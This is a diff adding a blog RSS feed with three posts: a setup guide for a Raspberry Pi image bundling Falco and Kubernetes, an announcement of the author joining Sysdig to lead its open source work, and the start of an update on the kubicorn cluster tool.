@@ -1,0 +1,1245 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Unix</title>
+	<atom:link href="https://www.nivenly.com/category/unix/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.nivenly.com</link>
+	<description>Open Source Advocate</description>
+	<lastBuildDate>Mon, 29 Jun 2020 22:46:05 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.8.11</generator>
+
+<image>
+	<url>https://www.nivenly.com/wp-content/uploads/2016/11/cropped-imageedit_1_3569246463-32x32.png</url>
+	<title>Unix</title>
+	<link>https://www.nivenly.com</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Falco 0.22.1 and Kubernetes 1.18 on armv7 using NOVIX</title>
+		<link>https://www.nivenly.com/falco-and-kubernetes-on-armv7-using-novix/</link>
+		<comments>https://www.nivenly.com/falco-and-kubernetes-on-armv7-using-novix/#comments</comments>
+		<pubDate>Fri, 01 May 2020 05:26:55 +0000</pubDate>
+		<dc:creator><![CDATA[Kris Nova]]></dc:creator>
+				<category><![CDATA[C]]></category>
+		<category><![CDATA[K8s]]></category>
+		<category><![CDATA[Unix]]></category>
+		<category><![CDATA[arch linux]]></category>
+		<category><![CDATA[arm]]></category>
+		<category><![CDATA[armv7]]></category>
+		<category><![CDATA[falco]]></category>
+		<category><![CDATA[kernel]]></category>
+		<category><![CDATA[kris nova]]></category>
+		<category><![CDATA[kubernetes]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[linux kernel]]></category>
+		<category><![CDATA[novix]]></category>
+		<category><![CDATA[raspberry pi]]></category>
+		<category><![CDATA[secure]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[syscall]]></category>
+		<category><![CDATA[sysdig]]></category>
+
+		<guid isPermaLink="false">http://www.nivenly.com/?p=921</guid>
+		<description><![CDATA[Sup nerds. So if you want to see me live demo this check out my live stream at 11am Pacific at twitch.tv/setns on Friday. I will post the recording here after it&#8217;s done. So if you have been following along on Twitter you have probably seen my talking about my new server cabinet I have been working [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>Sup nerds.</p>
+<hr />
+<p>So if you want to see me live demo this check out my live stream at 11am Pacific at <a href="https://twitch.tv/setns">twitch.tv/setns</a> on Friday. I will post the recording here after it&#8217;s done.</p>
+<hr />
+<p><img class="alignright wp-image-935 size-full" src="http://www.nivenly.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-28-21-57-25.png" alt="" width="577" height="351" srcset="https://www.nivenly.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-28-21-57-25.png 577w, https://www.nivenly.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-28-21-57-25-300x182.png 300w, https://www.nivenly.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-28-21-57-25-575x350.png 575w" sizes="(max-width: 577px) 100vw, 577px" />So if you have been following along on <a href="https://twitter.com/krisnova">Twitter</a> you have probably seen my talking about my new server cabinet I have been working on, as well as a few tweets about running Falco on ARM.</p>
+<p>So recently I joined <a href="https://sysdig.com">Sysdig, Inc</a> as chief OSS and I have been hacking on the kernel and our open source security tools for the past few months.</p>
+<p>If you have ever used <code>wireshark</code> or <code>sysdig</code> or <code>falco</code> then yeah &#8211; we are THOSE folks. <a href="http://github.com/falcosecurity/falco">Falco</a> is written in C++ and uses either a kernel module or a BPF probe to trace system call events in the Linux kernel. It&#8217;s fairly complicated to get all the pieces installed and working well on a Linux system, let alone a Kubernetes system.</p>
+<p>So I figured everyone could use a fun project during the apocalypse including myself. So <strong>today I made a few branches of Linux, Falco, and Kubernetes and got everything dialed in nicely and compiling on ARMv7</strong></p>
+<p>So if you are interested in Kubernetes and Linux security, if you enjoy free and open source software, and if you have a raspberry pi or another arm board laying around please follow along and try out my distro I slapped together today.</p>
+<p>So let&#8217;s understand what we have going on here.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<hr />
+<p>&nbsp;</p>
+<h1>NOVIX</h1>
+<p><a class="github-button" href="https://github.com/kris-nova/novix" data-icon="octicon-star" aria-label="Star kris-nova/novix on GitHub">Star</a></p>
+<p><a href="https://github.com/kris-nova/novix">github.com/kris-nova/novix</a></p>
+<p>So I put together an image that should make this is easy as pi (pun intended) to set up. It&#8217;s my operating system so if you don&#8217;t like I don&#8217;t care. Get off my lawn.</p>
+<h3>What is inside NOVIX?</h3>
+<table class="tg">
+<tbody>
+<tr>
+<th class="tg-0lax">Component</th>
+<th class="tg-0lax">Version</th>
+</tr>
+<tr>
+<td class="tg-0lax">Architecture</td>
+<td class="tg-0lax">armv7</td>
+</tr>
+<tr>
+<td class="tg-0lax">Kernel</td>
+<td class="tg-0lax">Linux novix 4.19.118-1-ARCH armv7l GNU/Linux</td>
+</tr>
+<tr>
+<td class="tg-0lax">Operating System Base</td>
+<td class="tg-0lax">Arch Linux</td>
+</tr>
+<tr>
+<td class="tg-0lax">Operating System</td>
+<td class="tg-0lax">Novix</td>
+</tr>
+<tr>
+<td class="tg-0lax">Falco</td>
+<td class="tg-0lax">0.22.0</td>
+</tr>
+<tr>
+<td class="tg-0lax">Kubernetes</td>
+<td class="tg-0lax">1.18</td>
+</tr>
+<tr>
+<td class="tg-0lax">Kubeadm</td>
+<td class="tg-0lax">1.18</td>
+</tr>
+<tr>
+<td class="tg-0lax">Tested on Chips</td>
+<td class="tg-0lax">RaspberryPi 3/4 (armv7) Raspberry Pi 1 B (armv6)</td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h3>Where do I get NOVIX?</h3>
+<p>See the<a href="https://github.com/kris-nova/novix/releases/latest"> latest RELEASE</a> on GitHub</p>
+<table class="tg">
+<tbody>
+<tr>
+<th class="tg-0lax">Image</th>
+<th class="tg-0lax">Download</th>
+<th class="tg-0lax">Arch</th>
+<th class="tg-0lax">Size</th>
+</tr>
+<tr>
+<td class="tg-0lax">Novix 1.0.1</td>
+<td class="tg-0lax"><a href="https://nivenly.com/novix/novix-1.0.1-armv7.img.gz">novix-1.0.1-armv7.img.gz</a></td>
+<td class="tg-0lax">armv7</td>
+<td class="tg-0lax">4.3gb</td>
+</tr>
+<tr>
+<td class="tg-0lax">Novix 1.0.0</td>
+<td class="tg-0lax"><a href="https://nivenly.com/novix/novix-1.0.0-armv7.img.gz">novix-1.0.0-armv7.img.gz</a></td>
+<td class="tg-0lax">armv7</td>
+<td class="tg-0lax">8.5gb</td>
+</tr>
+</tbody>
+</table>
+<p>Included in the image:</p>
+<ul>
+<li>Kernel headers</li>
+<li>Falco objects</li>
+<li>Kubernetes binaries</li>
+<li>Docker</li>
+<li>CRI</li>
+<li>Emacs</li>
+<li>grpc</li>
+<li>jq</li>
+</ul>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<hr />
+<p>&nbsp;</p>
+<h1>Setting up NOVIX on a Raspberry Pi 3/4</h1>
+<p>I am assuming you are running Linux, if you aren&#8217;t you should probably start. Otherwise you can duck duck go how to do this on Windows or a Mac &#8211; I am sure there are a lot of resources out there.</p>
+<h3>Download NOVIX and flash to your SD card</h3>
+<pre class=" language-bash"><code class=" language-bash">mkdir ~/novix &amp;&amp; cd ~/novix
+fdisk -l # Use this command to find your SD card (mine is usually /dev/sdc)
+umount/dev/sdc*
+fdisk /dev/sdc # (Use the device that matches your SD card from above)</code></pre>
+<p><a href="https://archlinuxarm.org/platforms/armv6/raspberry-pi">Thanks Arch Linux Arm Community.</a></p>
+<p>At the fdisk prompt, delete old partitions and create a new one:<br />
+Type o. This will clear out any partitions on the drive.<br />
+Type p to list partitions. There should be no partitions left.<br />
+Type n, then p for primary, 1 for the first partition on the drive, press ENTER to accept the default first sector, then type +110M for the last sector.<br />
+Type t, then c to set the first partition to type W95 FAT32 (LBA).<br />
+Type n, then p for primary, 2 for the second partition on the drive, and then press ENTER twice to accept the default first and last sector.<br />
+Write the partition table and exit by typing w.</p>
+<p>Now format the boot partition</p>
+<pre class=" language-bash"><code class=" language-bash">mkfs.vfat /dev/sdc1
+</code></pre>
+<p>And now the root partition</p>
+<pre class=" language-bash"><code class=" language-bash">mkfs.ext4 /dev/sdc2
+</code></pre>
+<p>And now let&#8217;s set up our sd card</p>
+<pre class=" language-bash"><code class=" language-bash">wget https://nivenly.com/novix/novix-1.0.1-armv7.img.gz
+gunzip --stdout novix-1.0.1-armv7.img.gz | sudo dd bs=4M of=/dev/sdc
+sync
+</code></pre>
+<p>If you get stuck check out the official <a href="https://www.raspberrypi.org/documentation/installation/installing-images/linux.md">installation guide</a> and just use my image instead of the one they suggest.</p>
+<p>A better example can be found at the official arm for arch linux <a href="https://archlinuxarm.org/platforms/armv6/raspberry-pi">installation guide</a></p>
+<p>Throw the SD card into the back of your raspberry pi, hook it up to your network, and give it some power. You should see a solid light and a blinky light on the card (not the network) indicating that your pi is online.</p>
+<h3>SSH into your NOVIX instance</h3>
+<p>Now we are assuming you have a lovely DHCP server online somewhere and your pi should now be on your network. Find it&#8217;s IP address by pulling client lists from your networking gear, arping, guessing, nmap, whatever. I just went into my unifi dashboard and there it was!</p>
+<p>&nbsp;</p>
+<p><img class="size-medium wp-image-950 aligncenter" src="http://www.nivenly.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-28-22-26-21.png" alt="" width="251" height="244" /></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<table class="tg">
+<tbody>
+<tr>
+<th class="tg-0lax">Default NOVIX Username</th>
+<th class="tg-0lax">Default NOVIX Password</th>
+</tr>
+<tr>
+<td class="tg-0lax">novix</td>
+<td class="tg-0lax">charlie</td>
+</tr>
+</tbody>
+</table>
+<pre class=" language-bash"><code class=" language-bash">ssh novix@10.0.0.36
+cat README
+</code></pre>
+<p>Notice if you type <code>novix</code> and hit tab to complete there are a handful of handy commands.</p>
+<hr />
+<p>&nbsp;</p>
+<h1>Running Falco</h1>
+<p>Falco should come precompiled. The kernel module should be loaded and the daemon should already be running.</p>
+<p><code class=" language-bash">novix.falco-logs</code></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<hr />
+<p>&nbsp;</p>
+<h1>Running Kubernetes</h1>
+<p>Kubernetes 1.18 should also be baked into the image and all dependencies should already be installed and configured.</p>
+<h3>The Kubernetes Master</h3>
+<p>Start by setting up a master. Pick a hostname you want to use for your master (NOTE: you should also probably put this in <code>/etc/hosts</code> on all the machines in your cluster)</p>
+<p>In this example we will use <code>novix-master</code> for our hostname. Set it using the following command</p>
+<p><code class=" language-bash">novix.hostname novix-master</code></p>
+<p>Now start your master server</p>
+<p><code class=" language-bash">novix.k8s-master</code></p>
+<p>You should see the output of <code>kubeadm</code> giving you a &#8220;join command&#8221; that should look something like</p>
+<p><code class=" language-bash">kubeadm join 10.0.0.44:443 --token uvjdta.h41bhz0aw5scnvka \<br />
+--discovery-token-ca-cert-hash sha256:0d0c32d30ab1dd2a5f3ca6f1d83b61aba9204bf6f8aa8f76e6c50ee37becb6ba </code></p>
+<p>Note the following:</p>
+<table class="tg">
+<tbody>
+<tr>
+<th class="tg-0lax">Key</th>
+<th class="tg-0lax">Value</th>
+</tr>
+<tr>
+<td class="tg-0lax">Server</td>
+<td class="tg-0lax"><code class=" language-bash">10.0.0.43</code></td>
+</tr>
+<tr>
+<td class="tg-0lax">Token</td>
+<td class="tg-0lax"> <code class=" language-bash">uvjdta.h41bhz0aw5scnvka</code></td>
+</tr>
+<tr>
+<td class="tg-0lax">Hash</td>
+<td class="tg-0lax"> <code class=" language-bash">sha256:0d0c32d30ab1dd2a5f3ca6f1d83b61aba9204bf6f8aa8f76e6c50ee37becb6ba</code></td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+<p>Now install Calico CNI on your cluster.</p>
+<div id="tabs-pod-install" class="ui-tabs ui-corner-all ui-widget ui-widget-content">
+<div id="tabs-pod-install-0" class="ui-tabs-panel ui-corner-bottom ui-widget-content" role="tabpanel" aria-labelledby="ui-id-1" aria-hidden="false">
+<div class="highlight">
+<pre><code class="language-shell" data-lang="shell">kubectl apply -f https://docs.projectcalico.org/v3.11/manifests/calico.yaml
+</code></pre>
+</div>
+</div>
+</div>
+<h3>The Kubernetes Node(s)</h3>
+<p>Set up a new novix machine as one of your nodes. Set a new hostname.</p>
+<p><code class=" language-bash">novix.hostname novix-001</code></p>
+<p>Now either run the pasted <code>kubeadm join</code> command above, or you can try</p>
+<p><code class=" language-bash">novix.k8s-join 10.0.0.43 uvjdta.h41bhz0aw5scnvka sha256:0d0c32d30ab1dd2a5f3ca6f1d83b61aba9204bf6f8aa8f76e6c50ee37becb6ba</code></p>
+<p>As long as everything can route you should now have a working kubernetes cluster with Falco.</p>
+<p>&nbsp;</p>
+<hr />
+<p>&nbsp;</p>
+<p><a href="https://twitter.com/r3dcrosse/status/1256126565068361729?s=20"><img class="aligncenter wp-image-970 size-full" src="http://www.nivenly.com/wp-content/uploads/2020/04/Screenshot-from-2020-05-01-00-42-40.png" alt="" width="600" height="270" srcset="https://www.nivenly.com/wp-content/uploads/2020/04/Screenshot-from-2020-05-01-00-42-40.png 600w, https://www.nivenly.com/wp-content/uploads/2020/04/Screenshot-from-2020-05-01-00-42-40-300x135.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></a></p>
+<p>&nbsp;</p>
+]]></content:encoded>
+			<wfw:commentRss>https://www.nivenly.com/falco-and-kubernetes-on-armv7-using-novix/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>Open Source at Sysdig</title>
+		<link>https://www.nivenly.com/oss-sysdig/</link>
+		<comments>https://www.nivenly.com/oss-sysdig/#comments</comments>
+		<pubDate>Wed, 21 Aug 2019 06:00:25 +0000</pubDate>
+		<dc:creator><![CDATA[Kris Nova]]></dc:creator>
+				<category><![CDATA[C]]></category>
+		<category><![CDATA[Go]]></category>
+		<category><![CDATA[K8s]]></category>
+		<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[Unix]]></category>
+
+		<guid isPermaLink="false">http://www.nivenly.com/?p=741</guid>
+		<description><![CDATA[Earlier this year I found myself taking a much needed break from employment. I began taking a meticulous approach at looking for a new gig. I was astonished and overwhelmed at the interest I had from amazing organizations in the Cloud Native ecosystem. I met with large tech companies, startups, and entrepreneurs yet to start [&#8230;]]]></description>
+				<content:encoded><![CDATA[<h3 style="text-align: center;">Earlier this year I found myself taking a much needed break from employment.</h3>
+<h1></h1>
+<p><img class=" wp-image-817 alignright" style="border: 2px solid black;" src="http://www.nivenly.com/wp-content/uploads/2019/07/B55A3382-ACB6-452E-8D48-F63242AA9767-1-200x300.jpg" alt="" width="438" height="657" srcset="https://www.nivenly.com/wp-content/uploads/2019/07/B55A3382-ACB6-452E-8D48-F63242AA9767-1-200x300.jpg 200w, https://www.nivenly.com/wp-content/uploads/2019/07/B55A3382-ACB6-452E-8D48-F63242AA9767-1-768x1152.jpg 768w, https://www.nivenly.com/wp-content/uploads/2019/07/B55A3382-ACB6-452E-8D48-F63242AA9767-1-683x1024.jpg 683w, https://www.nivenly.com/wp-content/uploads/2019/07/B55A3382-ACB6-452E-8D48-F63242AA9767-1-383x575.jpg 383w, https://www.nivenly.com/wp-content/uploads/2019/07/B55A3382-ACB6-452E-8D48-F63242AA9767-1-233x350.jpg 233w" sizes="(max-width: 438px) 100vw, 438px" />I began taking a meticulous approach at looking for a new gig. I was astonished and overwhelmed at the interest I had from amazing organizations in the Cloud Native ecosystem. I met with large tech companies, startups, and entrepreneurs yet to start their journey. I noticed everyone was very excited about Kubernetes. Every meeting shared the common theme. It seemed like the entire industry was obsessed with solving their unique problems with our new distributed kernel: Kubernetes.</p>
+<p>&nbsp;</p>
+<blockquote><p>There was only one problem:  <strong>Kubernetes is effectively &#8220;complete&#8221;</strong></p></blockquote>
+<p>&nbsp;</p>
+<p style="text-align: left;">Don&#8217;t get me wrong, there is still a lot of work to do and Kubernetes will always have room for improvement.</p>
+<p style="text-align: left;">My point here is that the core functionality of Kubernetes has not only been completed, but iterated on several times over. The scope of the project is relatively finite, and we have reached a point of maturity where we have functional components to satisfy this scope. The API is several versions deep, and the goal of the project was to provide a platform for the ecosystem to build on. We have achieved that. With that being said, taking another &#8220;Kubernetes Centric&#8221; role didn&#8217;t seem very attractive to me. I love Kubernetes and have been working with the core upstream community for a long time, but I think it&#8217;s time to pivot slightly.</p>
+<p>&nbsp;</p>
+<h3 style="text-align: center;">I am an innovator.</h3>
+<p style="text-align: center;">One could argue the majority of innovation <strong>within</strong> Kubernetes has long since been crafted, whereas innovation <strong>with</strong> Kubernetes is just beginning.</p>
+<p>&nbsp;</p>
+<h3 style="text-align: center;">Regardless, I am convinced Kubernetes is here to stay.</h3>
+<p><img class=" wp-image-677 alignleft" src="http://www.nivenly.com/wp-content/uploads/2018/03/k8s-300x300.png" alt="" width="167" height="167" srcset="https://www.nivenly.com/wp-content/uploads/2018/03/k8s-300x300.png 300w, https://www.nivenly.com/wp-content/uploads/2018/03/k8s-150x150.png 150w, https://www.nivenly.com/wp-content/uploads/2018/03/k8s-350x350.png 350w, https://www.nivenly.com/wp-content/uploads/2018/03/k8s.png 400w" sizes="(max-width: 167px) 100vw, 167px" /></p>
+<p>As the new Cloud Native &#8220;kernel&#8221; for distributed systems management, Kubernetes surely won&#8217;t be disappearing from my career any time soon. Nor will the CNCF. As a Kubernetes expert naturally I began my investigation into discovering technology that solved real problems in unique and powerful ways. I really wanted to find technology that I believed in, that I still hadn&#8217;t mastered, and that would get me excited. I wanted to go deeper into the little black boxes that still seemed like magic to me. I wanted more. I found myself speaking with many companies and looked at a lot of open source tools: service meshes, networking tools, deployment tools, etc.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h1 style="text-align: center;">There was one company that stood out&#8230;</h1>
+<p><img class=" wp-image-748 aligncenter" src="http://www.nivenly.com/wp-content/uploads/2019/07/sysdig-social-sharing-logo-500x500-300x300.png" alt="" width="138" height="138" srcset="https://www.nivenly.com/wp-content/uploads/2019/07/sysdig-social-sharing-logo-500x500-300x300.png 300w, https://www.nivenly.com/wp-content/uploads/2019/07/sysdig-social-sharing-logo-500x500-150x150.png 150w, https://www.nivenly.com/wp-content/uploads/2019/07/sysdig-social-sharing-logo-500x500-350x350.png 350w, https://www.nivenly.com/wp-content/uploads/2019/07/sysdig-social-sharing-logo-500x500.png 500w" sizes="(max-width: 138px) 100vw, 138px" /></p>
+<h3 style="text-align: center;">I see the potential in gaining visibility into our systems at the kernel level, while operating a containerized system on top.</h3>
+<h3 style="text-align: center;">Period.</h3>
+<p>&nbsp;</p>
+<p><a href="https://sysdig.com/" target="_blank" rel="noopener"><img class="wp-image-749 alignleft" src="http://www.nivenly.com/wp-content/uploads/2019/07/twitter-share-sysdig-300x288.png" alt="" width="80" height="77" srcset="https://www.nivenly.com/wp-content/uploads/2019/07/twitter-share-sysdig-300x288.png 300w, https://www.nivenly.com/wp-content/uploads/2019/07/twitter-share-sysdig-768x736.png 768w, https://www.nivenly.com/wp-content/uploads/2019/07/twitter-share-sysdig-600x575.png 600w, https://www.nivenly.com/wp-content/uploads/2019/07/twitter-share-sysdig-365x350.png 365w, https://www.nivenly.com/wp-content/uploads/2019/07/twitter-share-sysdig.png 868w" sizes="(max-width: 80px) 100vw, 80px" /></a>Furthermore there are a lot of other reasons I made the choice I did. To be be completely honest I simply fell in love with the way everyone worked. They were a low level shop of hackers and genuine people. Everyone I met was empowered and knew precisely what they were talking about. It was a refreshing interviewing experience. Good friends from open source like the infamous POP truly helped make me feel welcomed and respected. During my interview we white boarded the Linux kernel not to pass a frivolous test, but because we genuinely needed the diagram for our discussion on <a href="https://en.wikipedia.org/wiki/Berkeley_Packet_Filter">eBPF.</a> I immediately knew that this job was going to push me forward technically. I loved it.</p>
+<p>As the saga goes, the company offered me a position to take on ownership of our open source tools and I was thrilled. I am quite excited for our team, and an opportunity to do what I love doing: inspiring engineers and solving concrete problems with them!</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<hr />
+<h1 style="text-align: center;"><strong>So let&#8217;s talk Falco.</strong></h1>
+<p>&nbsp;</p>
+<p>As part of my new role at Sysdig I will be managing our OSS team, while simultaneously working on our tools with them. I am way too excited about new friends in <a href="https://github.com/cncf/sig-security">Kubernetes SIG-security</a>. Growing Falco and driving adoption will be a primary goal for me at Sysdig. We want to flesh Falco out as the defacto way of pulling metrics from the kernel for runtime security and intrusion detection.</p>
+<p><strong><a href="https://falco.org" target="_blank" rel="noopener"><img class="wp-image-776 alignright" src="http://www.nivenly.com/wp-content/uploads/2019/07/falco-logo-300x120.png" alt="" width="430" height="172" srcset="https://www.nivenly.com/wp-content/uploads/2019/07/falco-logo-300x120.png 300w, https://www.nivenly.com/wp-content/uploads/2019/07/falco-logo-768x306.png 768w, https://www.nivenly.com/wp-content/uploads/2019/07/falco-logo-1024x408.png 1024w, https://www.nivenly.com/wp-content/uploads/2019/07/falco-logo-750x299.png 750w, https://www.nivenly.com/wp-content/uploads/2019/07/falco-logo-878x350.png 878w, https://www.nivenly.com/wp-content/uploads/2019/07/falco-logo.png 1192w" sizes="(max-width: 430px) 100vw, 430px" /></a></strong>Once upon a time a simple network packet had every bit of information you needed for total forensics analysis. Today with Kubernetes abstractions sharing network, disk, and memory across containerized process the network is no longer a viable avenue for learning about our complete systems behavior. This is where Falco and eBPF come into the picture.</p>
+<p>Falco uses two critical components into gaining visibility of our systems. The first is a comprehensive list of syscall information that we access via eBPF. The second is our context from Kubernetes. By joining these two otherwise completely separated bits of data together, we now have everything we need to secure a Kubernetes cluster.</p>
+<p>Falco allows users to dynamically build rules against this rich data set, and can take action if and when a rule is broken. This noninvasive and elegant approach to security is built on battle tested concepts, applied in exciting new ways. To be honest, I can&#8217;t wait to start hacking on the kernel with the rest of the folks on the team. I am excited to go deeper into kernel security with eBPF and Falco.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<hr />
+<h1 style="text-align: center;"><strong>So lets get started!</strong></h1>
+<h3><strong><img class="wp-image-799 alignright" style="border: 2px solid black;" src="http://www.nivenly.com/wp-content/uploads/2019/07/ea48e21e-c192-47ef-ab49-b2862841f042-683x1024.jpg" alt="" width="471" height="706" srcset="https://www.nivenly.com/wp-content/uploads/2019/07/ea48e21e-c192-47ef-ab49-b2862841f042-683x1024.jpg 683w, https://www.nivenly.com/wp-content/uploads/2019/07/ea48e21e-c192-47ef-ab49-b2862841f042-200x300.jpg 200w, https://www.nivenly.com/wp-content/uploads/2019/07/ea48e21e-c192-47ef-ab49-b2862841f042-768x1152.jpg 768w, https://www.nivenly.com/wp-content/uploads/2019/07/ea48e21e-c192-47ef-ab49-b2862841f042-383x575.jpg 383w, https://www.nivenly.com/wp-content/uploads/2019/07/ea48e21e-c192-47ef-ab49-b2862841f042-233x350.jpg 233w" sizes="(max-width: 471px) 100vw, 471px" /></strong></h3>
+<p>Today I am pleased to announce full time employment with Sysdig!</p>
+<p>&nbsp;</p>
+<p>I will be spending some time getting to know our current state of affairs and exploring our other open source tools moving forward. Stay tuned for updates as we start to dial up our presence in the open source ecosystem with tools like Falco.</p>
+<p>&nbsp;</p>
+<p>Please reach out if you are interested in collaborating or would like to find out more about our new projects. My email is <a href="mailto:kris.nova@sysdig.com">nova@sysdig.com</a> and I would love to hear from you.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<ul>
+<li><a href="mailto:kris.nova@sysdig.com">kris.nova@sysdig.com</a></li>
+<li><a href="http://slack.sysdig.com">slack.sysdig.com</a></li>
+<li><a href="http://github.com/falcosecurity/falco">github.com/falcosecurity/falco</a></li>
+<li><a href="http://falco.org">falco.org</a></li>
+<li><a href="http://twitter.com/sysdig">@sysdig</a></li>
+<li><a href="http://twitter.com/falco_org">@falco_org</a></li>
+</ul>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p style="text-align: center;">
+]]></content:encoded>
+			<wfw:commentRss>https://www.nivenly.com/oss-sysdig/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>Meanwhile, in the kubicorn repository&#8230;</title>
+		<link>https://www.nivenly.com/meanwhile-in-the-kubicorn-repository/</link>
+		<comments>https://www.nivenly.com/meanwhile-in-the-kubicorn-repository/#comments</comments>
+		<pubDate>Wed, 14 Mar 2018 05:40:42 +0000</pubDate>
+		<dc:creator><![CDATA[Kris Nova]]></dc:creator>
+				<category><![CDATA[Go]]></category>
+		<category><![CDATA[K8s]]></category>
+		<category><![CDATA[Unix]]></category>
+		<category><![CDATA[api]]></category>
+		<category><![CDATA[article]]></category>
+		<category><![CDATA[blog]]></category>
+		<category><![CDATA[cluster]]></category>
+		<category><![CDATA[cluster api]]></category>
+		<category><![CDATA[controller]]></category>
+		<category><![CDATA[infrastructure]]></category>
+		<category><![CDATA[k8s]]></category>
+		<category><![CDATA[kubernetes]]></category>
+		<category><![CDATA[kubicorn]]></category>
+		<category><![CDATA[update]]></category>
+
+		<guid isPermaLink="false">http://www.nivenly.com/?p=671</guid>
+		<description><![CDATA[Okay &#8211; wow &#8211; it&#8217;s been a long time since I have blogged here&#8230; &#160; ❤️ Hi everyone! I missed you! ❤️ &#160; &#160; So due to some unforeseen circumstance in the past ~year or so&#8230; I was unable to continue contributing to my pride and joy Kubicorn! It&#8217;s been a real bummer, but I am glad [&#8230;]]]></description>
+				<content:encoded><![CDATA[<h1>Okay &#8211; wow &#8211; it&#8217;s been a long time since I have blogged here&#8230;</h1>
+<p>&nbsp;</p>
+<p style="text-align: center;">❤️ Hi everyone! I missed you! ❤️</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p style="text-align: left;"><a href="github.com/kubicorn/kubicorn"><img class="alignleft" src="https://raw.githubusercontent.com/kubicorn/kubicorn/master/docs/img/kubicorn-trans.png" alt="" width="212" height="236" /></a>So due to some unforeseen circumstance in the past ~year or so&#8230; I was unable to continue contributing to my <strong>pride</strong> and <strong>joy</strong> <a href="https://github.com/kubicorn/kubicorn">Kubicorn!</a> It&#8217;s been a real bummer, but I am glad to say that those days are officially behind me!</p>
+<p>&nbsp;</p>
+<p>The good news? I am back! And we are working hard on making <code>kubicorn</code> even more amazing!</p>
+<p>&nbsp;</p>
+<p>So without further delay, let&#8217;s start looking into what I wanted to update everyone about <code>kubicorn</code>.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h1>What is <a href="http://github.com/kubicorn/kubicorn"><code>kubicorn</code></a>?</h1>
+<h3>Kubicorn is a Kubernetes infrastructure management tool!</h3>
+<p><code>kubicorn</code> attempts to solve managing kubernetes based infrastructure in a cloud native way. The project is supported by the <a href="https://www.cncf.io">Cloud Native Computing Foundation (CNCF) </a> and attempts to offer a few things unique to cloud native infrastructure:</p>
+<ol>
+<li>Modular components</li>
+<li>Vendorable library in Go</li>
+<li>A guarantee-less framework that is flexible and scalable</li>
+<li>A solid way to bootstrap and manage your infrastructure</li>
+<li>Software to manage infrastructure</li>
+</ol>
+<p>&nbsp;</p>
+<p>These patterns are fundamental to understanding cloud native technologies, and (in my opinion) are the future of infrastructure management!</p>
+<p style="text-align: center;"><em>How do I know this? I literally <a href="http://www.cnibook.info">wrote the book on it</a>&#8230;</em></p>
+<p>TLDR; It&#8217;s a badass command line tool that goes from <code>0</code>to <code>kubernetes</code> in just a few moments.</p>
+<p>&nbsp;</p>
+<h1>What&#8217;s new in <a href="http://github.com/kubicorn/kubicorn"><code>kubicorn</code></a>?</h1>
+<h3>We have officially adopted the Kubernetes cluster API</h3>
+<p>The cluster API is an official working group in the Kubernetes community.</p>
+<p>The pattern dictates that while bootstrapping a cluster, <code>kubicorn</code> will first create the Kubernetes control plane.</p>
+<p>Then <code>kubicorn</code> will define the control plane itself, as well as the machines that will serve as the nodes (workhorses) of the Kubernetes cluster.</p>
+<p>Finally, <code>kubicorn</code>will install a controller that will realize the machines defined in the previous step.</p>
+<p>This allows for arbitrary clients to adjust the machine definition, without having to care how <code>kubicorn</code> will <strong>autoscale</strong> their cluster.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.nivenly.com/wp-content/uploads/2018/03/k8s.png"><img class="aligncenter wp-image-677 size-thumbnail" src="http://www.nivenly.com/wp-content/uploads/2018/03/k8s-150x150.png" alt="" width="150" height="150" srcset="https://www.nivenly.com/wp-content/uploads/2018/03/k8s-150x150.png 150w, https://www.nivenly.com/wp-content/uploads/2018/03/k8s-300x300.png 300w, https://www.nivenly.com/wp-content/uploads/2018/03/k8s-350x350.png 350w, https://www.nivenly.com/wp-content/uploads/2018/03/k8s.png 400w" sizes="(max-width: 150px) 100vw, 150px" /></a></p>
+<p style="text-align: center;"><strong>Autoscaling infrastructure, the kubernetes way!</strong></p>
